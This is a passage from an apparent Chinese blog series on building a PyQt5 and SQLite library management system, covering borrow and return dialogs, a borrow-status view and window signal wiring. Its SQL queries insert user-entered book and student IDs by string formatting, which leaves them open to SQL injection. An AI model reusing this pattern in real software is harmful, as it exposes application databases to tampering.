除 用 户&quot;) hlayout = QHBoxLayout() hlayout.addWidget(self.deleteUserButton, Qt.AlignHCenter) self.widget = QWidget() self.widget.setLayout(hlayout) self.widget.setFixedHeight(48) font = QFont() font.setPixelSize(15) self.deleteUserButton.setFixedHeight(36) self.deleteUserButton.setFixedWidth(180) self.deleteUserButton.setFont(font) self.layout.addWidget(self.widget, Qt.AlignCenter) # 设置信号 self.deleteUserButton.clicked.connect(self.deleteUser) self.tableWidget.itemClicked.connect(self.getStudentInfo)if __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = UserManage() mainMindow.show() sys.exit(app.exec_())代码分析#这里使用 QtableWidget来展示当前所有的用户的学号以及姓名步骤如下：展示所有用户管理员选中一行点击删除用户提醒时候确认删除删除，同时刷新展示的数据实现效果#最后附上链接#项目地址：github仓库链接","link":"/f6234a21.html"},{"title":"PyQt5搭建图书馆管理系统（8）——借书&#x2F;还书功能","text":"借书功能实现#分析#本来借书的信息都是应该有RFID识别得到的，但是作为大作业，只能让用户输入信息了，但是书名之类的都不唯一，所以采取了与淘汰书籍一样的操作——让用户输入书号，自动匹配书本信息，然后确认借阅借阅时，需要处理的逻辑如下：用户输入的书号存在，就匹配信息给用户不存在就点击借阅，给出警告借阅书籍数已经达到上限5本 ，给出警告不允许借阅同样的书更新Book表信息的借阅次数，剩余可借阅书数在User_Book表插入记录借阅成功给出提示代码实现#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import *import qdarkstyleimport timefrom PyQt5.QtSql import *class borrowBookDialog(QDialog): borrow_book_success_signal = pyqtSignal() def __init__(self, StudentId, parent=None): super(borrowBookDialog, self).__init__(parent) self.studentId = StudentId self.setUpUI() self.setWindowModality(Qt.WindowModal) self.setWindowTitle(&quot;借阅书籍&quot;) def setUpUI(self): # 书名，书号，作者，分类，添加数量.出版社,出版日期 # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类 BookCategory = [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot; , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;] self.resize(300, 400) self.layout = QFormLayout() self.setLayout(self.layout) # Label控件 self.borrowStudentLabel = QLabel(&quot;借 阅 人:&quot;) self.borrowStudentIdLabel = QLabel(self.studentId) self.titlelabel = QLabel(&quot; 借阅书籍&quot;) self.bookNameLabel = QLabel(&quot;书 名:&quot;) self.bookIdLabel = QLabel(&quot;书 号:&quot;) self.authNameLabel = QLabel(&quot;作 者:&quot;) self.categoryLabel = QLabel(&quot;分 类:&quot;) self.publisherLabel = QLabel(&quot;出 版 社:&quot;) self.publishDateLabel = QLabel(&quot;出版日期:&quot;) # button控件 self.borrowBookButton = QPushButton(&quot;确认借阅&quot;) # lineEdit控件 self.bookNameEdit = QLineEdit() self.bookIdEdit = QLineEdit() self.authNameEdit = QLineEdit() self.categoryComboBox = QComboBox() self.categoryComboBox.addItems(BookCategory) self.publisherEdit = QLineEdit() self.publishTime = QLineEdit() self.bookNameEdit.setMaxLength(10) self.bookIdEdit.setMaxLength(6) self.authNameEdit.setMaxLength(10) self.publisherEdit.setMaxLength(10) # 添加进formlayout self.layout.addRow(&quot;&quot;, self.titlelabel) self.layout.addRow(self.borrowStudentLabel, self.borrowStudentIdLabel) self.layout.addRow(self.bookNameLabel, self.bookNameEdit) self.layout.addRow(self.bookIdLabel, self.bookIdEdit) self.layout.addRow(self.authNameLabel, self.authNameEdit) self.layout.addRow(self.categoryLabel, self.categoryComboBox) self.layout.addRow(self.publisherLabel, self.publisherEdit) self.layout.addRow(self.publishDateLabel, self.publishTime) self.layout.addRow(&quot;&quot;, self.borrowBookButton) # 设置字体 font = QFont() font.setPixelSize(20) self.titlelabel.setFont(font) font.setPixelSize(16) self.borrowStudentIdLabel.setFont(font) font.setPixelSize(14) self.borrowStudentLabel.setFont(font) self.bookNameLabel.setFont(font) self.bookIdLabel.setFont(font) self.authNameLabel.setFont(font) self.categoryLabel.setFont(font) self.publisherLabel.setFont(font) self.publishDateLabel.setFont(font) self.bookNameEdit.setFont(font) self.bookNameEdit.setReadOnly(True) self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;) self.bookIdEdit.setFont(font) self.authNameEdit.setFont(font) self.authNameEdit.setReadOnly(True) self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;) self.publisherEdit.setFont(font) self.publisherEdit.setReadOnly(True) self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;) self.publishTime.setFont(font) self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;) self.categoryComboBox.setFont(font) self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;) # button设置 font.setPixelSize(16) self.borrowBookButton.setFont(font) self.borrowBookButton.setFixedHeight(32) self.borrowBookButton.setFixedWidth(140) # 设置间距 self.titlelabel.setMargin(8) self.layout.setVerticalSpacing(10) self.borrowBookButton.clicked.connect(self.borrowButtonClicked) self.bookIdEdit.textChanged.connect(self.bookIdEditChanged) self.bookIdEdit.returnPressed.connect(self.borrowButtonClicked) def borrowButtonClicked(self): # 获取书号，书号为空或不存在库中，则弹出错误 # 向Book_User表插入记录，更新User表以及Book表 BookId = self.bookIdEdit.text() # BookId为空的处理 if (BookId == &quot;&quot;): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要借的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes)) return # 打开数据库 db = db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() # 如果BookId不存在 sql = &quot;SELECT * FROM Book WHERE BookId='%s'&quot; % BookId query.exec_(sql) if (not query.next()): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要借的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes)) return # 借书上限5本 sql = &quot;SELECT COUNT(StudentId) FROM User_Book WHERE StudentId='%s' AND BorrowState=1&quot; % ( self.studentId) query.exec_(sql) if (query.next()): borrowNum = query.value(0) if (borrowNum == 5): QMessageBox.warning(self, &quot;警告&quot;, &quot;您借阅的书达到上限（5本）,借书失败！&quot;, QMessageBox.Yes, QMessageBox.Yes) return # 不允许重复借书 sql = &quot;SELECT COUNT(StudentId) FROM User_Book WHERE StudentId='%s' AND BookId='%s' AND BorrowState=1&quot; % ( self.studentId, BookId) query.exec_(sql) if (query.next() and query.value(0)): QMessageBox.warning(self, &quot;警告&quot;, &quot;您已经借阅了本书并尚未归还，借阅失败！&quot;, QMessageBox.Yes, QMessageBox.Yes) return # 更新User表 sql = &quot;UPDATE User SET TimesBorrowed=TimesBorrowed+1,NumBorrowed=NumBorrowed+1 WHERE StudentId='%s'&quot; % self.studentId query.exec_(sql) db.commit() # 更新Book表 sql = &quot;UPDATE Book SET NumCanBorrow=NumCanBorrow-1,NumBorrowed=NumBorrowed+1 WHERE BookId='%s'&quot; % BookId query.exec_(sql) db.commit() # 插入User_Book表 timenow = time.strftime('%Y-%m-%d', time.localtime(time.time())) sql = &quot;INSERT INTO User_Book VALUES ('%s','%s','%s',NULL,1)&quot; % (self.studentId, BookId, timenow) print(sql) query.exec_(sql) db.commit() print(QMessageBox.information(self, &quot;提示&quot;, &quot;借阅成功!&quot;, QMessageBox.Yes, QMessageBox.Yes)) self.borrow_book_success_signal.emit() self.close() return def bookIdEditChanged(self): bookId = self.bookIdEdit.text() if (bookId == &quot;&quot;): self.bookNameEdit.clear() self.publisherEdit.clear() self.authNameEdit.clear() self.publishTime.clear() db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() sql = &quot;SELECT * FROM Book WHERE BookId='%s'&quot; % (bookId) query.exec_(sql) # 查询对应书号，如果存在就更新form if (query.next()): self.bookNameEdit.setText(query.value(0)) self.authNameEdit.setText(query.value(2)) self.categoryComboBox.setCurrentText(query.value(3)) self.publisherEdit.setText(query.value(4)) self.publishTime.setText(query.value(5)) returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = borrowBookDialog(&quot;PB15000135&quot;) mainMindow.show() sys.exit(app.exec_())实现效果#归还书籍功能实现#分析#一开始的时候被借书功能带偏了，依旧使用了让用户输入书号的方式，但其实使用QComboBox列出已借阅图书让用户选择更好，大家可以自己试试实现逻辑如下:如果存在借阅记录，就自动匹配书籍信息如果输入为空，给出警告并未借阅，给出提示更新User表，Book表以及User_Book表实现代码#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import *import qdarkstyleimport timefrom PyQt5.QtSql import *class returnBookDialog(QDialog): return_book_success_signal=pyqtSignal() def __init__(self, StudentId, parent=None): super(returnBookDialog, self).__init__(parent) self.studentId = StudentId self.setUpUI() self.setWindowModality(Qt.WindowModal) self.setWindowTitle(&quot;归还书籍&quot;) def setUpUI(self): # 书名，书号，作者，分类，添加数量.出版社,出版日期 # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类 BookCategory = [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot; , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;] self.resize(300, 400) self.layout = QFormLayout() self.setLayout(self.layout) # Label控件 self.returnStudentLabel = QLabel(&quot;还 书 人:&quot;) self.returnStudentIdLabel = QLabel(self.studentId) self.titlelabel = QLabel(&quot; 归还书籍&quot;) self.bookNameLabel = QLabel(&quot;书 名:&quot;) self.bookIdLabel = QLabel(&quot;书 号:&quot;) self.authNameLabel = QLabel(&quot;作 者:&quot;) self.categoryLabel = QLabel(&quot;分 类:&quot;) self.publisherLabel = QLabel(&quot;出 版 社:&quot;) self.publishDateLabel = QLabel(&quot;出版日期:&quot;) # button控件 self.returnBookButton = QPushButton(&quot;确认归还&quot;) # lineEdit控件 self.bookNameEdit = QLineEdit() self.bookIdEdit = QLineEdit() self.authNameEdit = QLineEdit() self.categoryComboBox = QComboBox() self.categoryComboBox.addItems(BookCategory) self.publisherEdit = QLineEdit() self.publishTime = QLineEdit() self.bookNameEdit.setMaxLength(10) self.bookIdEdit.setMaxLength(6) self.authNameEdit.setMaxLength(10) self.publisherEdit.setMaxLength(10) # 添加进formlayout self.layout.addRow(&quot;&quot;, self.titlelabel) self.layout.addRow(self.returnStudentLabel, self.returnStudentIdLabel) self.layout.addRow(self.bookNameLabel, self.bookNameEdit) self.layout.addRow(self.bookIdLabel, self.bookIdEdit) self.layout.addRow(self.authNameLabel, self.authNameEdit) self.layout.addRow(self.categoryLabel, self.categoryComboBox) self.layout.addRow(self.publisherLabel, self.publisherEdit) self.layout.addRow(self.publishDateLabel, self.publishTime) self.layout.addRow(&quot;&quot;, self.returnBookButton) # 设置字体 font = QFont() font.setPixelSize(20) self.titlelabel.setFont(font) font.setPixelSize(16) self.returnStudentIdLabel.setFont(font) font.setPixelSize(14) self.returnStudentLabel.setFont(font) self.bookNameLabel.setFont(font) self.bookIdLabel.setFont(font) self.authNameLabel.setFont(font) self.categoryLabel.setFont(font) self.publisherLabel.setFont(font) self.publishDateLabel.setFont(font) self.bookNameEdit.setFont(font) self.bookNameEdit.setReadOnly(True) self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;) self.bookIdEdit.setFont(font) self.authNameEdit.setFont(font) self.authNameEdit.setReadOnly(True) self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;) self.publisherEdit.setFont(font) self.publisherEdit.setReadOnly(True) self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;) self.publishTime.setFont(font) self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;) self.categoryComboBox.setFont(font) self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;) # button设置 font.setPixelSize(16) self.returnBookButton.setFont(font) self.returnBookButton.setFixedHeight(32) self.returnBookButton.setFixedWidth(140) # 设置间距 self.titlelabel.setMargin(8) self.layout.setVerticalSpacing(10) self.returnBookButton.clicked.connect(self.returnButtonClicked) self.bookIdEdit.textChanged.connect(self.bookIdEditChanged) def returnButtonClicked(self): # 获取书号，书号为空或并未借阅，则弹出错误 # 更新Book_User表User表以及Book表 BookId = self.bookIdEdit.text() # BookId为空的处理 if (BookId == &quot;&quot;): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要还的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes)) return # 打开数据库 db = db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() # 如果未借阅 sql = &quot;SELECT * FROM User_Book WHERE StudentId='%s' AND BookId='%s' AND BorrowState=1&quot; %(self.studentId,BookId) query.exec_(sql) if (not query.next()): print(QMessageBox.information(self, &quot;提示&quot;, &quot;您并未借阅此书，故无需归还&quot;, QMessageBox.Yes, QMessageBox.Yes)) return # 更新User表 sql = &quot;UPDATE User SET NumBorrowed=NumBorrowed-1 WHERE StudentId='%s'&quot; % self.studentId query.exec_(sql) db.commit() # 更新Book表 sql = &quot;UPDATE Book SET NumCanBorrow=NumCanBorrow+1 WHERE BookId='%s'&quot; % BookId query.exec_(sql) db.commit() # 更新User_Book表 timenow = time.strftime('%Y-%m-%d', time.localtime(time.time())) sql = &quot;UPDATE User_Book SET ReturnTime='%s',BorrowState=0 WHERE StudentId='%s' AND BookId='%s' AND BorrowState=1&quot; % (timenow,self.studentId,BookId) query.exec_(sql) db.commit() print(QMessageBox.information(self, &quot;提示&quot;, &quot;归还成功!&quot;, QMessageBox.Yes, QMessageBox.Yes)) self.return_book_success_signal.emit() self.close() return def bookIdEditChanged(self): bookId = self.bookIdEdit.text() if (bookId == &quot;&quot;): self.bookNameEdit.clear() self.publisherEdit.clear() self.authNameEdit.clear() self.publishTime.clear() db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() # 在User_Book表中找借阅记录，如果存在借阅，则更新form内容 sql = &quot;SELECT * FROM User_Book WHERE StudentId='%s' AND BookId='%s' AND BorrowState=1&quot; % ( self.studentId, bookId) query.exec_(sql) if (query.next()): # 更新form内容 sql = &quot;SELECT * FROM Book WHERE BookId='%s'&quot; % (bookId) query.exec_(sql) # 查询对应书号，如果存在就更新form if (query.next()): self.bookNameEdit.setText(query.value(0)) self.authNameEdit.setText(query.value(2)) self.categoryComboBox.setCurrentText(query.value(3)) self.publisherEdit.setText(query.value(4)) self.publishTime.setText(query.value(5)) returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = returnBookDialog(&quot;PB15000135&quot;) mainMindow.show() sys.exit(app.exec_())实现效果#最后附上链接#项目地址：github仓库链接","link":"/8effeb9b.html"},{"title":"PyQt5搭建图书馆管理系统（9）——借阅状态查询","text":"分析#这个可以说是实现的最简单的一个功能了，只需要结合一下QTableView和QSqlQueryModel对User_Book表和Book表做一个联查即可，直接贴上代码如下代码#12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import Qtimport qdarkstylefrom PyQt5.QtSql import *class BorrowStatusViewer(QWidget): def __init__(self, studentId): super(BorrowStatusViewer, self).__init__() self.resize(700, 500) self.studentId = studentId self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;) self.setUpUI() def setUpUI(self): self.db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) self.db.setDatabaseName('./db/LibraryManagement.db') self.db.open() # 分为两块，上方是已借未归还书，下方是已归还书 self.layout = QVBoxLayout(self) # Label设置 self.borrowedLabel = QLabel(&quot;未归还:&quot;) self.returnedLabel = QLabel(&quot;已归还:&quot;) self.borrowedLabel.setFixedHeight(32) self.borrowedLabel.setFixedWidth(60) self.returnedLabel.setFixedHeight(32) self.returnedLabel.setFixedWidth(60) font = QFont() font.setPixelSize(18) self.borrowedLabel.setFont(font) self.returnedLabel.setFont(font) # Table和Model self.borrowedTableView = QTableView() self.borrowedTableView.horizontalHeader().setStretchLastSection(True) self.borrowedTableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch) self.borrowedTableView.setEditTriggers(QAbstractItemView.NoEditTriggers) self.returnedTableView = QTableView() self.returnedTableView.horizontalHeader().setStretchLastSection(True) self.returnedTableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch) self.returnedTableView.setEditTriggers(QAbstractItemView.NoEditTriggers) self.borrowedQueryModel = QSqlQueryModel() self.returnedQueryModel = QSqlQueryModel() self.borrowedTableView.setModel(self.borrowedQueryModel) self.returnedTableView.setModel(self.returnedQueryModel) self.borrowedQuery() self.borrowedQueryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;) self.borrowedQueryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;) self.borrowedQueryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;) self.borrowedQueryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;) self.borrowedQueryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;) self.borrowedQueryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;) self.borrowedQueryModel.setHeaderData(6, Qt.Horizontal, &quot;借出时间&quot;) self.returnedQuery() self.returnedQueryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;) self.returnedQueryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;) self.returnedQueryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;) self.returnedQueryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;) self.returnedQueryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;) self.returnedQueryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;) self.returnedQueryModel.setHeaderData(6, Qt.Horizontal, &quot;借阅时间&quot;) self.returnedQueryModel.setHeaderData(7, Qt.Horizontal, &quot;归还时间&quot;) self.layout.addWidget(self.borrowedLabel) self.layout.addWidget(self.borrowedTableView) self.layout.addWidget(self.returnedLabel) self.layout.addWidget(self.returnedTableView) return def borrowedQuery(self): sql = &quot;SELECT Book.BookName,Book.BookId,Auth,Category,Publisher,PublishTime,BorrowTime FROM Book,User_Book WHERE Book.BookId=User_Book.BookId AND User_Book.BorrowState=1 AND StudentId='%s'&quot; % self.studentId self.borrowedQueryModel.setQuery(sql) return def returnedQuery(self): sql = &quot;SELECT Book.BookName,Book.BookId,Auth,Category,Publisher,PublishTime,BorrowTime,ReturnTime FROM Book,User_Book WHERE Book.BookId=User_Book.BookId AND User_Book.BorrowState=0 AND StudentId='%s'&quot; % self.studentId self.returnedQueryModel.setQuery(sql) returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = BorrowStatusViewer(&quot;PB15000135&quot;) mainMindow.show() sys.exit(app.exec_())实现效果#最后附上链接#项目地址：github仓库链接","link":"/5ec72e4f.html"},{"title":"PyQt5搭建图书馆管理系统（11）——窗口信号与槽以及主窗口循环(项目完)","text":"管理员主页信号与槽#窗口内信号与槽#在管理员主页代码的setUpUI中，可以看到如下代码123self.addBookButton.clicked.connect(self.addBookButtonClicked) self.dropBookButton.clicked.connect(self.dropBookButtonClicked) self.userManageButton.clicked.connect(self.userManage)这是Qt自带的信号与槽机制，也就是QPushButton点击触发，分别是添加书籍按钮点击触发弹出添加书籍对话框淘汰书籍按钮点击触发弹出淘汰书籍对话框用户管理按钮点击弹出用户管理对话框窗口间信号与槽#在管理员主页代码中的addBookButtonClicked和dropBookButtonClicked函数中，可以看到这样两行代码1addDialog.add_book_success_signal.connect(self.storageView.searchButtonClicked)1dropDialog.drop_book_successful_signal.connect(self.storageView.searchButtonClicked)同样的，我们找一下发送信号方的信号定义在borrowBookDialog中有borrow_book_success_signal = pyqtSignal()同时可以在borrowButtonClicked函数中看到，当成功添加书籍时会发送信号而我们在管理员主页中，将这个信号与库存查询组件的的searchButtonClicked连接，也就是实现了当书籍添加时，动态刷新库存。UI交互良好另一个也是一样，就不赘述了学生用户主页信号与槽#窗口内信号与槽#与管理员主页一样，可以找到1234self.borrowBookButton.clicked.connect(self.borrowBookButtonClicked) self.returnBookButton.clicked.connect(self.returnBookButtonClicked) self.myBookStatus.clicked.connect(self.myBookStatusClicked) self.allBookButton.clicked.connect(self.allBookButtonClicked)窗口间信号与槽#在borrowBookButtonClicked函数可以找到12borrowDialog.borrow_book_success_signal.connect(self.borrowStatusView.borrowedQuery) borrowDialog.borrow_book_success_signal.connect(self.storageView.searchButtonClicked)这里既要刷新库存显示，同时也要刷新借书状态显示在returnBookButtonClicked函数可以找到123returnDialog.return_book_success_signal.connect(self.borrowStatusView.returnedQuery) returnDialog.return_book_success_signal.connect(self.borrowStatusView.borrowedQuery) returnDialog.return_book_success_signal.connect(self.storageView.searchButtonClicked)效果也是一样主窗口循环#在菜单栏中，有注册、修改密码、登录账户、退出登录、退出可以点击当然其能否点击需要根据当前窗口决定，比如如果已登录，当然就不能点击登录和修改密码了至于窗口的setCentralWidget调用，比如输入密码，是切换到用户主页还是到管理员主页，当然是看发射的信号是什么啦实现代码#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import QIcon, QFontfrom PyQt5.QtCore import *import qdarkstylefrom SignIn import SignInWidgetfrom SignUp import SignUpWidgetimport sipfrom AdminHome import AdminHomefrom StudentHome import StudentHomefrom changePasswordDialog import changePasswordDialogclass Main(QMainWindow): def __init__(self, parent=None): super(Main, self).__init__(parent) self.layout = QHBoxLayout() self.widget = SignInWidget() self.resize(900, 600) self.setWindowTitle(&quot;欢迎登陆图书馆管理系统&quot;) self.setCentralWidget(self.widget) bar = self.menuBar() self.Menu = bar.addMenu(&quot;菜单栏&quot;) self.signUpAction = QAction(&quot;注册&quot;, self) self.changePasswordAction =QAction(&quot;修改密码&quot;,self) self.signInAction = QAction(&quot;登录&quot;, self) self.quitSignInAction = QAction(&quot;退出登录&quot;, self) self.quitAction = QAction(&quot;退出&quot;, self) self.Menu.addAction(self.signUpAction) self.Menu.addAction(self.changePasswordAction) self.Menu.addAction(self.signInAction) self.Menu.addAction(self.quitSignInAction) self.Menu.addAction(self.quitAction) self.signUpAction.setEnabled(True) self.changePasswordAction.setEnabled(True) self.signInAction.setEnabled(False) self.quitSignInAction.setEnabled(False) self.widget.is_admin_signal.connect(self.adminSignIn) self.widget.is_student_signal[str].connect(self.studentSignIn) self.Menu.triggered[QAction].connect(self.menuTriggered) def adminSignIn(self): sip.delete(self.widget) self.widget = AdminHome() self.setCentralWidget(self.widget) self.changePasswordAction.setEnabled(False) self.signUpAction.setEnabled(True) self.signInAction.setEnabled(False) self.quitSignInAction.setEnabled(True) def studentSignIn(self, studentId): sip.delete(self.widget) self.widget = StudentHome(studentId) self.setCentralWidget(self.widget) self.changePasswordAction.setEnabled(False) self.signUpAction.setEnabled(True) self.signInAction.setEnabled(False) self.quitSignInAction.setEnabled(True) def menuTriggered(self, q): if(q.text()==&quot;修改密码&quot;): changePsdDialog=changePasswordDialog(self) changePsdDialog.show() changePsdDialog.exec_() if (q.text() == &quot;注册&quot;): sip.delete(self.widget) self.widget = SignUpWidget() self.setCentralWidget(self.widget) self.widget.student_signup_signal[str].connect(self.studentSignIn) self.signUpAction.setEnabled(False) self.changePasswordAction.setEnabled(True) self.signInAction.setEnabled(True) self.quitSignInAction.setEnabled(False) if (q.text() == &quot;退出登录&quot;): sip.delete(self.widget) self.widget = SignInWidget() self.setCentralWidget(self.widget) self.widget.is_admin_signal.connect(self.adminSignIn) self.widget.is_student_signal[str].connect(self.studentSignIn) self.signUpAction.setEnabled(True) self.changePasswordAction.setEnabled(True) self.signInAction.setEnabled(False) self.quitSignInAction.setEnabled(False) if (q.text() == &quot;登录&quot;): sip.delete(self.widget) self.widget = SignInWidget() self.setCentralWidget(self.widget) self.widget.is_admin_signal.connect(self.adminSignIn) self.widget.is_student_signal[str].connect(self.studentSignIn) self.signUpAction.setEnabled(True) self.changePasswordAction.setEnabled(True) self.signInAction.setEnabled(False) self.quitSignInAction.setEnabled(False) if (q.text() == &quot;退出&quot;): qApp = QApplication.instance() qApp.quit() returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = Main() mainMindow.show() sys.exit(app.exec_())实现效果#附上链接#项目地址：github仓库链接一些感想#这个项目写了大概四天的样子，同时也是第一次使用Qt，很多机制其实自己都不太熟悉，像主窗口的切换，都处理的很潦草，移出控件都强行使用sip.delete删除。Qt东西很多，但使用的时候去查阅一下就好了，前几天的大作业评比，感觉自己做的还是不够好，主要是功能不够全面。一开始想先写完再说，到时候重构就是了，但最后又没有心思重构 。希望下次做项目的时候，自己可以想好了再出发","link":"/9f815f0d.html"},{"title":"PyQt5搭建图书馆管理系统（10）—— 学生主页以及修改代码","text":"学生主页设计#分析#在学生主页，主要实现以下功能：1、借阅书籍2、归还书籍3、借阅状态查询4、书籍库存查询使用四个QPushButton，分别用于弹出借阅书籍对话框、归还书籍对话框 、切换到借阅状态查询、切换到书籍库存查询实现代码#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import QIcon, QFontfrom PyQt5.QtCore import Qtimport sipimport qdarkstylefrom BookStorageViewer import BookStorageViewerfrom borrowBookDialog import borrowBookDialogfrom returnBookDialog import returnBookDialogfrom BorrowStatusViewer import BorrowStatusViewerclass StudentHome(QWidget): def __init__(self, studentId): super().__init__() self.StudentId = studentId self.resize(900, 600) self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;) self.setUpUI() def setUpUI(self): # 总布局 self.layout = QHBoxLayout(self) # 按钮布局 self.buttonLayout = QVBoxLayout() # 按钮 self.borrowBookButton = QPushButton(&quot;借书&quot;) self.returnBookButton = QPushButton(&quot;还书&quot;) self.myBookStatus = QPushButton(&quot;借阅状态&quot;) self.allBookButton = QPushButton(&quot;所有书籍&quot;) self.buttonLayout.addWidget(self.borrowBookButton) self.buttonLayout.addWidget(self.returnBookButton) self.buttonLayout.addWidget(self.myBookStatus) self.buttonLayout.addWidget(self.allBookButton) self.borrowBookButton.setFixedWidth(100) self.borrowBookButton.setFixedHeight(42) self.returnBookButton.setFixedWidth(100) self.returnBookButton.setFixedHeight(42) self.myBookStatus.setFixedWidth(100) self.myBookStatus.setFixedHeight(42) self.allBookButton.setFixedWidth(100) self.allBookButton.setFixedHeight(42) font = QFont() font.setPixelSize(16) self.borrowBookButton.setFont(font) self.returnBookButton.setFont(font) self.myBookStatus.setFont(font) self.allBookButton.setFont(font) self.storageView = BookStorageViewer() self.borrowStatusView=BorrowStatusViewer(self.StudentId) self.allBookButton.setEnabled(False) self.layout.addLayout(self.buttonLayout) self.layout.addWidget(self.storageView) self.borrowBookButton.clicked.connect(self.borrowBookButtonClicked) self.returnBookButton.clicked.connect(self.returnBookButtonClicked) self.myBookStatus.clicked.connect(self.myBookStatusClicked) self.allBookButton.clicked.connect(self.allBookButtonClicked) def borrowBookButtonClicked(self): borrowDialog = borrowBookDialog(self.StudentId,self) borrowDialog.borrow_book_success_signal.connect(self.borrowStatusView.borrowedQuery) borrowDialog.borrow_book_success_signal.connect(self.storageView.searchButtonClicked) borrowDialog.show() borrowDialog.exec_() return def returnBookButtonClicked(self): returnDialog = returnBookDialog(self.StudentId,self) returnDialog.return_book_success_signal.connect(self.borrowStatusView.returnedQuery) returnDialog.return_book_success_signal.connect(self.borrowStatusView.borrowedQuery) 